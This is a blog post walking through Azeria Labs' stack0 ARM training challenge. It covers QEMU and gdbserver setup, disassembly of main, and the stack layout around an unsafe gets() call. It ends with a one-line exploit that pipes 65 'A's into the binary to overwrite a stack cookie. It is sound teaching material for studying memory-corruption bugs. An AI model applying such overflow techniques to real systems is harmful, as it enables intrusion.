<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Smashing ARM Stack for Fun - Part I</title>
  <meta name="description" content="This is the first of a serie of posts about exploiting 32 bits Armbinaries.These challenges weretakenfrom Azeria Labs.">

  
    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
  

  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX","output/HTML-CSS"],
        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
	TeX: {
	  Macros: {
            
	  }
	}
      });
    </script>
    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
    
  

  
    <script
       src="https://code.jquery.com/jquery-3.4.1.min.js"
       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
       crossorigin="anonymous"></script>
  

  

    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
    

    
      <script src="https://d3js.org/d3.v4.min.js"></script>
    

    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
    <script src='/book-of-gehn/js/venn/helper.js'></script>

    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">

  <link rel="canonical" href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">

  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">

  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
</head>

  <body>
    <header>
	
		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
		
		
	

    

    
</header>

    <article class="group">
      <h1>Smashing ARM Stack for Fun - Part I</h1>
<p class="subtitle">January 14, 2021</p>

<p>This is the first of a serie of posts about exploiting 32 bits Arm
binaries.</p>

<p>These <a href="https://github.com/azeria-labs/ARM-challenges">challenges</a> were
<a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">taken</a>
from <a href="https://azeria-labs.com">Azeria Labs</a>.<!--more--></p>

<h2 id="setup">Setup</h2>

<p><label for="mmkd-689a865b48c7391b8cd07cb60dfc30a9" class="margin-toggle"> ⊕</label><input type="checkbox" id="mmkd-689a865b48c7391b8cd07cb60dfc30a9" class="margin-toggle" /></p>
<div id="mk-mmkd-689a865b48c7391b8cd07cb60dfc30a9"><span class="marginnote marginmarkdowncode"><p>For the records:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">qemu</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">arm</span>
  <span class="o">-</span><span class="n">M</span> <span class="n">versatilepb</span>
  <span class="o">-</span><span class="n">cpu</span> <span class="n">arm1176</span>
  <span class="o">-</span><span class="n">m</span> <span class="mi">256</span>
  <span class="o">-</span><span class="n">drive</span> <span class="s">"file=2020-12-02-raspios-buster-armhf-lite.img,if=none,index=0,media=disk,format=raw,id=disk0"</span>
  <span class="o">-</span><span class="n">device</span> <span class="s">"virtio-blk-pci,drive=disk0,disable-modern=on,disable-legacy=off"</span>
  <span class="o">-</span><span class="n">net</span> <span class="s">"user,hostfwd=tcp::3022-:22,hostfwd=tcp::9999-:9999"</span>
  <span class="o">-</span><span class="n">dtb</span> <span class="n">versatile</span><span class="o">-</span><span class="n">pb</span><span class="o">-</span><span class="n">buster</span><span class="o">-</span><span class="mf">5.4.51</span><span class="p">.</span><span class="n">dtb</span>
  <span class="o">-</span><span class="n">kernel</span> <span class="n">kernel</span><span class="o">-</span><span class="n">qemu</span><span class="o">-</span><span class="mf">5.4.51</span><span class="o">-</span><span class="n">buster</span>
  <span class="o">-</span><span class="n">append</span> <span class="s">"root=/dev/vda2 panic=1"</span>
  <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">reboot</span>
  <span class="o">-</span><span class="n">net</span> <span class="n">nic</span>
  <span class="o">-</span><span class="n">nographic</span>
</code></pre></div></div></span></div>
<div><script>$(document).ready(function () {$('#mk-mmkd-689a865b48c7391b8cd07cb60dfc30a9 > span').insertAfter($('#mmkd-689a865b48c7391b8cd07cb60dfc30a9'))});</script></div>

<p>Let’s <a href="/book-of-gehn/articles/2020/12/15/Qemulating-Rasbian-ARM.html">spin a Rasbian</a>
first. Make your to forward a port for the <code class="highlighter-rouge">ssh</code> and another for the
<code class="highlighter-rouge">gdbserver</code> so we can connect to them from the host machine.</p>

<p>There are <a href="https://github.com/azeria-labs/ARM-challenges">7 binaries</a>
compiled for ARM for 32 bits, not stripped and dynamically linked.</p>

<p>We will focus on <code class="highlighter-rouge">stack0</code> for now.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file stack0
stack0: ELF 32-bit LSB executable, ARM, EABI5 version 1 <span class="o">(</span>SYSV<span class="o">)</span>,
dynamically linked, interpreter /lib/ld-linux-armhf.so.3,
<span class="k">for </span>GNU/Linux 2.6.32,
BuildID[sha1]<span class="o">=</span>1171fa6db1d5176af44d6d462427f8d244bd82c8,
not stripped
</code></pre></div></div>

<p>Spin the <code class="highlighter-rouge">gdbserver</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>gdbserver :9999 stack0
Process /home/pi/stack0 created<span class="p">;</span> pid <span class="o">=</span> 410
Listening on port 9999
</code></pre></div></div>

<p>And now, from the host, connect your <code class="highlighter-rouge">gdb</code> to the server. In my case I
will use <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, an enhanced version
of <code class="highlighter-rouge">gdb</code>.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb-multiarch <span class="nt">-q</span> <span class="nt">-x</span> ~/scripts/pwndbg.gdbinit
pwndbg&gt; target extended-remote :9999
Remote debugging using &lt;...&gt;
Reading /home/pi/stack0 from remote target...
</code></pre></div></div>

<p>In addition to the debugger, I will use an
<a href="https://github.com/bad-address/iasm">interactive assembler</a> to play
with some Arm code that I may not understand but which I don’t want to
run in the debugger
(see <a href="/book-of-gehn/articles/2021/01/09/Interactive-Assembler.html">my post about <code class="highlighter-rouge">iasm</code></a>).</p>

<h2 id="stack-initialization">Stack initialization</h2>

<p>The stack initialization of <code class="highlighter-rouge">main</code> is as follows:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span>
 <span class="err">►</span> <span class="mh">0x1044c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
   <span class="mh">0x10450</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
   <span class="mh">0x10454</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
   <span class="mh">0x10458</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x50</span><span class="err">]</span>
   <span class="mh">0x1045c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
   <span class="mh">0x10460</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x10464</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x10468</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
   <span class="mh">0x1046c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
   <span class="mh">0x10470</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">lr</code> and the <code class="highlighter-rouge">fp</code> are pushed in that order (0x8 bytes),
the <code class="highlighter-rouge">fp</code> is updated and points to the pushed <code class="highlighter-rouge">lr</code> (<code class="highlighter-rouge">add fp, sp, #4</code>)
and then 0x50 bytes are allocated (<code class="highlighter-rouge">sub sp, sp, #0x50</code>).</p>

<p>The arguments of <code class="highlighter-rouge">main</code>, registers <code class="highlighter-rouge">r0</code> and <code class="highlighter-rouge">r1</code>, are saved on <em>top</em> of
the stack (<code class="highlighter-rouge">str r0, [fp, #-0x50]</code>, <code class="highlighter-rouge">str r1, [fp, #-0x54]</code>).</p>

<p>And then the cookie is stored:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x10460</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x10464</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
</code></pre></div></div>

<p>This is our target.</p>

<h2 id="call-to-gets">Call to <code class="highlighter-rouge">gets</code></h2>

<p>In the <code class="highlighter-rouge">main</code> function a call to <code class="highlighter-rouge">gets</code> is done with a buffer
allocated in the stack:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span>
   <span class="mh">0x10460</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x10464</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x10468</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
   <span class="mh">0x1046c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
 <span class="err">►</span> <span class="mh">0x10470</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
        <span class="n">r0</span><span class="o">:</span> <span class="mh">0xbefffb6c</span> <span class="err">◂—</span> <span class="mh">0x0</span>
        <span class="n">r1</span><span class="o">:</span> <span class="mh">0xbefffd04</span> <span class="err">—▸</span> <span class="mh">0xbefffe14</span> <span class="err">◂—</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pi</span><span class="o">/</span><span class="n">stack0</span><span class="err">'</span>
        <span class="n">r2</span><span class="o">:</span> <span class="mh">0xbefffd0c</span> <span class="err">—▸</span> <span class="mh">0xbefffe24</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="err">'</span>
        <span class="n">r3</span><span class="o">:</span> <span class="mh">0xbefffb6c</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</code></pre></div></div>

<p>The registers before the call to <code class="highlighter-rouge">gets</code> were:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------  ----  ------  ---------  ------  ---------  ------  ------
    r0  1fb4  r1      eeee:eeee  r2      0          r3      1fb4
    r4  0     r5      0          r6      0          r7      0
    r8  0     r9/sb   0          r10     0          r11/fp  1ffc
r12/ip  0     r13/sp  1fa8       r14/lr  aaaa:aaaa  r15/pc  100:20
------  ----  ------  ---------  ------  ---------  ------  ------
</code></pre></div></div>

<p>And the manually-annotated stack was:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>   <span class="c1"># &lt;-- from sp to the end of the mapped page
</span><span class="p">[</span>
        <span class="o">--</span>
        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
        <span class="o">|</span>   <span class="o">...</span> <span class="mi">16</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
        <span class="o">--</span>
   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
 <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
        <span class="o">--</span>
<span class="p">]</span> <span class="o">&lt;--</span> <span class="n">base</span> <span class="n">of</span> <span class="n">stack</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">r3</code> points <em>almost</em> to the begin of the bunch of zeros, just 4
bytes below.</p>

<p>We can verify this writing and inspecting the memory:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">r3</span><span class="p">:]</span> <span class="o">=</span> <span class="n">b</span><span class="s">"AAAABBBBCCCC"</span>
<span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
<span class="p">[</span>
        \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>
        \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>
        \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>    <span class="o">==</span> <span class="n">these</span> <span class="n">are</span> <span class="n">still</span> <span class="n">zeros</span>
<span class="n">buf</span> <span class="o">--&gt;</span> <span class="n">AAAA</span>
        <span class="n">BBBB</span>
        <span class="n">CCCC</span>
        \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
        <span class="o">...</span>
<span class="p">]</span>
</code></pre></div></div>

<p>Indeed, the destination buffer of <code class="highlighter-rouge">gets</code> has 0x48 - 0x8 bytes
(we subtract 4 bytes for the cookie and 4 bytes for the stored <code class="highlighter-rouge">fp</code>)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
<span class="p">[</span>
        <span class="o">--</span>
        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
<span class="n">buf</span> <span class="o">----|--&gt;</span><span class="n">AAAA</span>
        <span class="o">|</span>   <span class="n">BBBB</span>
        <span class="o">|</span>   <span class="n">CCCC</span>
        <span class="o">|</span>   <span class="o">...</span> <span class="mi">13</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
        <span class="o">--</span>
   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
 <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
        <span class="o">--</span>
<span class="p">]</span>
</code></pre></div></div>

<h2 id="the-target">The target</h2>

<p>The program stores a cookie initialized to zero in the stack <em>before</em>
the call to <code class="highlighter-rouge">gets</code> and then it checks its value.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x10460</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
   <span class="mh">0x10464</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
    <span class="p">...</span>
   <span class="mh">0x10470</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x10474</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
   <span class="mh">0x10478</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>    <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
</code></pre></div></div>

<p>If it is still zero jumps to a <code class="highlighter-rouge">puts</code> that prints <code class="highlighter-rouge">"Try again?"</code>.</p>

<p>But if an overflow occurs, the cookies will be non-zero and another
<code class="highlighter-rouge">puts</code> will executed.</p>

<p>This is the print that we are looking for:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x10480</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x18</span><span class="err">]</span>
 <span class="err">►</span> <span class="mh">0x10484</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>The address of the string to print is stored in the code segment, 0x18
bytes below the program counter at 0x10480.</p>

<p>However 0x10480 + 0x18 == 0x10498 is not correct:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span> <span class="mh">0x10498</span>
<span class="mh">0x10498</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>  <span class="mh">0xe24bd004</span>  <span class="mh">0xe8bd8800</span>  <span class="mh">0x0001051c</span>  <span class="mh">0x00010548</span>
</code></pre></div></div>

<p>почему?</p>

<blockquote>
  <p>“When using R15 as the base register you must remember it contains an
address 8 bytes on from the address of the current instruction.”
<cite class="epigraph">Arm documentation</cite></p>
</blockquote>

<p>So it is 0x10498 + 0x8:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span> <span class="mh">0x104a0</span>
<span class="mh">0x104a0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>  <span class="mh">0x0001051c</span>  <span class="mh">0x00010548</span>  <span class="mh">0xe92d43f8</span>  <span class="mh">0xe1a07000</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="p">(</span><span class="n">char</span><span class="o">*</span><span class="p">)</span><span class="mh">0x0001051c</span>
<span class="err">$</span><span class="mi">21</span> <span class="o">=</span> <span class="mh">0x1051c</span> <span class="s">"you have changed the 'modified' variable"</span>
</code></pre></div></div>

<h2 id="the-exploit">The exploit</h2>

<p>Writing 0x40+1 bytes we will overflow the buffer overwriting the cookie
in the stack but without corrupting the stack further.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span> | ./stack0
you have changed the <span class="s1">'modified'</span> variable
</code></pre></div></div>



    </article>
    <span class="print-footer">Smashing ARM Stack for Fun - Part I - January 14, 2021 - Gehn</span>
    <footer>
    <hr class="slender">
    <div class="credits">
        <span>&copy; 2021
            
            Gehn
        </span></br>
            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
        <br>
        

    
    </div>
</footer>

  </body>
</html>
